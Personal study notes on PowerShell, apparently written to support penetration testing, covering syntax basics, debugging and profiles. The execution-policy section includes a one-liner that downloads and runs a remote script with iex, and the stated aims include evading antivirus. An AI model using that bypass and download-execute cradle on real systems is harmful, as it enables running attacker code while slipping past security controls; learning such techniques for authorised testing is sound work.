# Why Need to learn Powershell?
- Prevent pwned by antivirus and hide more effectively in Windows machine。
- Perform post exploitation

# TOC in this articles
- Install powershell
- powershell basic
- How to run and execute a powershell script
- powershell socket programming
- powershell for port scanning and brute-force service

# Powershell Installation
- Linux:sudo apt-get install -y powershell
- Windows: installed by default

# Basic command that need to know
## Get-Help for command
- Get-Help -Name Get-Process
- Update-Help

## Get Syntax of a command
- Get-Command Get-Process -Syntax

## Get Command for an example usage
- Get-Help Get-Process -Example

## List all build in Variable
- Get-Variable

## Find a module
- ```Find-module -Name *modulename*```

# Use stream writer to output the file
System.IO.StreamWriter 

# Powershell basic
Variable example: $banana
Declare variable banana = 100 : New-Variable banana -Value 100
Easy method: $banana = 100
delte variable:Remove-Variable banana
If need protection: New-Variable banana -Value 100 -force -Option readonly
delete protected variable: Remove-Variable -Force banana
for constant: New-Variable banana -Value 100 -Force -Option constant

# array
$array = 1,2,3,4
$array = 1..4
$array=1,"2017",([System.Guid]::NewGuid()),(get-date)
$a=@()  # 空數組
$a=,"1" # 一个元素的數組

# Get value from array
Example:
$ip=ipconfig
$ip[1] # 獲取ipconfig第二行的數據

# varify an array
$test -is [array]

# add value in array
$books += "5"

# Hashtable
## Create Hash table
$stu=@{ Name = "test";Age="12";sex="man" }
 
哈希表里存数组：
$stu=@{ Name = "hei";Age="12";sex="man";Books="kali","sqlmap","powershell" }

哈希表的插入与删除:
$Student=@{}
$Student.Name="hahaha"
$stu.Remove("Name")

# Object
【之后看】

# Control Statement
-eq ：equal
-ne ：not equal
-gt ：greater than
-ge ：greater equal
-lt ：less than
-le ：less equal
-contains ：contains
-notcontains :不包含
!($a): 求反
-and ：和
-or ：或
-xor ：异或
-not ：逆

# if-else
if-else:
​
if($value -eq 1){
    code1
}else{
    code2
}

# while
while($n -gt 0){
    code
}

# for
$sum=0
for($i=1;$i -le 100;$i++)
{
    $sum+=$i
}
$sum

foreach
# 打印出windows目录下大于1mb的文件名
foreach($file in dir c:windows)
{
    if($file.Length -gt 1mb)
    {
        $File.Name
    }
}

# 函数
function Invoke-PortScan {
<#
.SYNOPSIS 
简介
​
.DESCRIPTION
描述
    
.PARAMETER StartAddress
参数
​
.PARAMETER EndAddress
参数
​
.EXAMPLE
PS > Invoke-PortScan -StartAddress 192.168.0.1 -EndAddress 192.168.0.254
用例
#>
code
}

# 异常处理
Try{
    $connection.open()
    $success = $true
}Catch{
    $success = $false
}

#Get-ExecutionPolicy -List
List of policies
- Restricted
- AllSigned
- RemoteSigned
- Unrestricted
- Bypass
- Undefined

## Bypass method
- Get-ExecutionPolicy	获取当前的执行策略
- Get-Content .test.ps1 | powershell.exe -noprofile –	通过管道输入进ps
- powershell -nop -c “iex(New-Object Net.WebClient).DownloadString(‘http://192.168.1.2/test.ps1‘)”

# Use powershell for Socket TCP Programming
- Open port 21 and return banner from port 21
- File: Tcp-Demo.ps1

```

```
# How to run a powershell script
## In Linux 
.\filename.ps1

## In Windows
- Open powershell ISE with ps1 file prss run
- .\filename.ps1
- in vscode: right click your file select run code or ctrl+shift+N

### Run your script that have a funtion call henshincode
```
function henshincode{
    param($ridercode = "ZIO")
    "HENSHIN!!, I am Kamen Rider $ridercode."
}
```

### in PowershellISE
```
PS C:\>.\filename.ps1
PS C:\>henshincode
```

# Declare a Parameter in your script
```
param($name = 'bub')
"Hello $name, how are you?"
```


# How to debug powershell script in vs code?
- Step 1 : Install PowerShell extensions.
- Step 2 : To open the Debug view, in the View Bar select Debug from the View menu or press Ctrl + Shift + D.
- Step 3 : In the Launch Configuration dropdown (shown in the following screenshot), select the PowerShell Launch (current file) configuration.
- Step 4 : Press the Green button for debug

## Options
- Continue / Pause – F5
- Step Over – F10 
- Step Into – F11
- Step Out – Shift + F11
- Restart – Ctrl + Shift + F5
- Stop – Shift + F5

4 Section : variables, watch, call stack and break points

# How to import a module
Open powershell ISE than Enter
Import-Module PATH_TO_PSM1_File
Import-Module C:\Users\tomli\Documents\Resource\GithubXDicrectory\InfosecPosh101\Labs\01_Basics\PS-Log.psm1

# Set Profile to alter your powershell prompt (Forensic Timeline Purpose)
Step 1: New-Item -path $profile -type file -force
Step 2: nopad.exe $profile
Step 3: Save the below code and restart your powershell
```
function prompt 
{
	Write-Host("PS "+$(get-date) + " "+$(pwd) + ">") -nonewline 
	return " "
}
start-transcript -path ("C:\transcripts\$env:computername"+"_"+(get-date -format yyyyMMddHHmm)+".txt" ) -force -noclobber
```

# References
http://www.pstips.net/

[Start-Transcript]